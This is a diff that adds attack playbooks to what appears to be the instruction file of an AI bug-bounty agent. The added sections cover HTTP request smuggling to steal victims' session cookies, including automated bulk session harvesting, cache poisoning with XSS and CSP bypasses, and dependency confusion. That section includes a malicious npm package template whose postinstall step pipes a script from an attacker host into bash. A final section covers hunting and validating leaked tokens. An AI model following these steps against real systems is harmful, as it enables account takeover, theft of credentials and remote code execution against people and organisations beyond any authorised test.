@@ -66,6 +66,107 @@ Other agents cover smart contracts, math/crypto, and economics. You own the web 
 - Subdomain takeover: check DNS CNAMEs pointing to unclaimed cloud assets (S3, GitHub Pages, Heroku, Azure).
 - WebSocket: test for missing auth on upgrade, message injection, cross-site WebSocket hijacking.
 
+### 9. HTTP Smuggling → Session Hijack (H100 Proven Chain)
+
+This chain appeared 4 times in the top 100 reports and enables mass account takeover.
+
+**Exploitation steps:**
+1. Find CL.TE desync on subdomain behind CDN (Akamai, Cloudflare, nginx)
+2. Craft smuggled request that forces victim's next request to become your controlled request
+3. Smuggled request creates open redirect → victim follows redirect WITH session cookies
+4. Redirect target = your collaborator server → steal session cookies
+5. Use stolen cookies to impersonate victim → full account access
+6. Automate with bots to harvest many sessions simultaneously
+
+**Where to test:**
+- Subdomains with "b" suffix or alternate spellings (often less hardened)
+- Login/authentication endpoints that issue session cookies
+- Any endpoint behind a reverse proxy or CDN
+
+**Testing method:**
+```bash
+# Send smuggled request with both headers
+POST / HTTP/1.1
+Host: target-subdomain.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1Host: collaborator.com
+```
+Monitor Burp Collaborator for incoming requests from other users.
+
+### 10. Cache Poisoning → Stored XSS on Sensitive Pages (H100 Proven Chain)
+
+This chain appeared 2 times in the top 100 reports against a major financial platform.
+
+**Exploitation steps:**
+1. Find unkeyed header reflected in response (X-Forwarded-Host, X-Original-URL, X-Rewrite-URL)
+2. Verify response is cached (check Cache-Control, CDN headers, X-Cache)
+3. Poison cache with XSS payload in the unkeyed header
+4. Wait for victim to visit the same URL → served poisoned cached copy
+5. XSS executes in victim's browser on the sensitive page (login, dashboard, payment)
+
+**CSP Bypass patterns:**
+- Find older JS libraries on scope domains (jQuery < 3.0, Bootstrap < 3.4.1)
+- jQuery selector gadget: `<script>` → jQuery converts to DOM element → executes
+- 'unsafe-eval' in CSP + jQuery = direct script execution
+- Search: `grep -r "jquery" --include="*.js" | sort` on scope domains
+
+**High-value targets for cache poisoning:**
+- Login pages — tokens, credentials in context
+- Dashboard/admin pages — session tokens, user data
+- Payment/checkout pages — financial data
+- Settings/profile pages — PII, API keys
+
+### 11. Supply Chain Attacks (H100 Proven — npm/Gem/PyPI)
+
+This chain appeared 2 times in the top 100 reports and enables RCE on target's infrastructure.
+
+**Exploitation steps:**
+1. Find target's package dependencies (package.json, Gemfile, requirements.txt in public repos)
+2. Extract package names
+3. Check if packages exist on public registry (npm, PyPI, RubyGems)
+4. If package doesn't exist → publish malicious package with same name
+5. Target's CI/CD installs package → arbitrary code execution via postinstall script
+
+**Malicious package template:**
+```json
+{
+  "name": "target-internal-package-name",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://attacker.com/shell.sh | bash"
+  }
+}
+```
+
+**Also check:** GitHub Actions (unpinned actions → impostor commits), Docker base images, Go modules
+
+### 12. Credential Leak Hunting (H100 Proven — 7 reports, $50K+ total)
+
+Leaked credentials in code repos or build artifacts appeared 5 times in the top 100.
+
+**Where to find leaked tokens:**
+- Public repos: `gh api -X GET "search/code?q=org:TARGET+filename:.env"`
+- Compiled apps: extract .env from Electron .asar files, Android APK, iOS IPA
+- Build logs: Travis CI, GitHub Actions logs contain secrets
+- Docker images: `docker run --rm -it TARGET/app:latest env`
+
+**Token types that pay:**
+- GitHub Personal Access Token (`ghp_`, `github_pat_`) → read/write all org repos
+- npm token (`npm_`) → publish to org's npm scope
+- AWS Access Key (`AKIA`) → full AWS access
+- Slack webhook (`hooks.slack.com`) → post to any channel
+- Stripe key (`sk_live_`) → payment processing access
+
+**Validation PoC:**
+```bash
+curl -H "Authorization: token ghp_xxxxx" https://api.github.com/user
+# If 200 → valid, check repos_access, org membership
+```
+
 ## Local Tool Integration
 
 When local execution is available, use installed CLI tools to expand and verify findings.
